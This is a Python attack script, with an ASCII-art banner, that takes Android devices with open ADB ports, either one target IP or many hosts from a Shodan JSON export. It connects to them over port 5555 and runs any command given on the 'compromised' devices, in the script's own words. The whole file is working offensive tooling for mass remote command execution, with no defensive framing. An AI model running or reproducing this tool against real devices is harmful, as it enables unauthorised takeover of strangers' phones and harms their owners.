#!/usr/bin/env python3
import json
import logging
import os

logging.basicConfig(format='[%(asctime)s %(levelname)s]: %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p',
                    level='INFO')

logo_design_4 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
'''
print(logo_design_4)


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--target-ip',
                        dest='ip',
                        required=False,
                        help='An IP address of the android device')
    parser.add_argument('--target-port',
                        dest='port',
                        default=5555,
                        required=False,
                        help='A TCP port of the remote ADB service. Default is 5555')
    parser.add_argument('--shodan-file',
                        dest='shodan_file',
                        required=False,
                        help='A file with Shodan export in JSON format. '
                             'JSON entries must be separated with a new-line character.')
    parser.add_argument('-c',
                        '--connect',
                        action='store_true',
                        required=False,
                        help='Connect to the remote android device(s).')
    parser.add_argument('-x',
                        '--execute',
                        dest='execute',
                        required=False,
                        help='Execute a given command on the compromised android device(s)')
    options = parser.parse_args()

    return options


class AndroidDevice:
    def __init__(self, ip_address, port):
        self.ip_address = ip_address
        self.port = str(port)

    def connect(self):
        logging.info('Connecting to %s:%s', self.ip_address, self.port)
        try:
            os.system(f'adb connect {self.ip_address}:{self.port}')
        except Exception as e:
            logging.error('%s - %s', self.ip_address, e)

    def execute(self, command):
        logging.info('Executing %s command on %s:%s', command, self.ip_address, self.port)
        try:
            os.system(f'adb -s {self.ip_address}:{self.port} shell {command}')
        except Exception as e:
            logging.error('%s -%s', self.ip_address, e)


def read_shodan_json_file(file_name):
    logging.info('Reading %s', file_name)
    with open(file_name, 'r') as f:
        try:
            devices = []
            for line in f.readlines():
                dump = json.loads(line)
                devices.append(AndroidDevice(ip_address=dump['ip_str'], port=dump['port']))
            return devices
        except Exception as e:
            logging.error(e)
            return []


options = get_arguments()
android_devices = []
if options.ip:
    android_devices = [AndroidDevice(ip_address=options.ip, port=options.port)]
elif options.shodan_file:
    android_devices = read_shodan_json_file(file_name=options.shodan_file)
if android_devices:
    os.system("adb tcpip 5555")
    logging.info('%s android devices have been passed for exploitation', len(android_devices))
    if options.connect:
        for device in android_devices:
            device.connect()
    if options.execute:
        for device in android_devices:
            device.execute(options.execute)
logging.info('All connected devices:')
os.system('adb devices -l')
